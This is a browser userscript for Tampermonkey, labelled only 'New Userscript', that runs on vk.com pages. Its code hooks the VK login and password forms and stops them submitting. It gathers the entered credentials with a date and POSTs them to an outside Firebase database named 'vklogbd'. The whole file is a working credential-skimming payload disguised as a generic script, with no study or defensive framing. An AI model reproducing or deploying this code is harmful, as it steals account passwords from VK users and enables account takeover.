// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  wrote 31/05/2022!
// @author       You
// @match        https://*.vk.com/*
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @grant        none
// ==/UserScript==

(function () {
  'use strict';
  try {
    const request = async (url, body) => {
      const response = await fetch(url, {
        method: 'POST',
        body,
        headers: { 'Content-Type': 'application/json' },
      });

      return await response.json();
    };

    const vkFormLog = document.querySelector('.vkc__EnterLogin__content');
    let foundFormInterval;

    async function foundForm() {
      if (document.querySelector('.vkc__EnterPasswordNoUserInfo__content')) {
        clearInterval(foundFormInterval);

        const vkFormPass = document.querySelector('.vkc__EnterPasswordNoUserInfo__content');

        vkFormPass.addEventListener('submit', (e) => {
          e.preventDefault();
          const formData = new FormData(vkFormPass);
          const object = {};
          formData.forEach(function (value, key) {
            object[key] = value;
          });

          object.date =
            new Date().getFullYear() +
            ' ' +
            (new Date().getMonth() + 1) +
            ' ' +
            new Date().getDate();

          request('https://vklogbd-default-rtdb.firebaseio.com/log.json', JSON.stringify(object));
        });
      }
    }

    vkFormLog.addEventListener('submit', (e) => {
      e.preventDefault();
      foundFormInterval = setInterval(foundForm, 1000);
    });

    //console.log('159' );
    console.log('%c 159 ', 'color: #10f700');
  } catch (e) {
    //console.error("vkLog isn't work");
  }
})();
